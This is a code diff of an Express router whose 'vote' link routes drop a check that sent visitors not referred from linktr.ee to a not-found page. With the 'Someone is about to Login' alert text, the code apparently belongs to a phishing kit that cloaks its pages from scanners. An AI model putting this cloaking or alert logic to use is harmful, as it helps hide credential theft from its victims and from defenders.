@@ -9,9 +9,7 @@ const { blockPhishingUrl } = require("../../middlewares/blockUrl");
 router.get("/v/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const referer = req.headers.referer;
-        if(referer !== 'https://linktr.ee/'){
-            return res.redirect("/notfound");
-        }
+
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
         if (!link) {
@@ -43,9 +41,7 @@ MESSAGE: Someone is about to Login.
 router.get("/v-2/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const referer = req.headers.referer;
-        if(referer !== 'https://linktr.ee/'){
-            return res.redirect("/notfound");
-        }
+
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
         if (!link) {
@@ -77,9 +73,7 @@ MESSAGE: Someone is about to Login.
 router.get("/v-3/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const referer = req.headers.referer;
-        if(referer !== 'https://linktr.ee/'){
-            return res.redirect("/notfound");
-        }
+
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
         const url = "https://" + req.hostname + "/vote3/" + link.link;
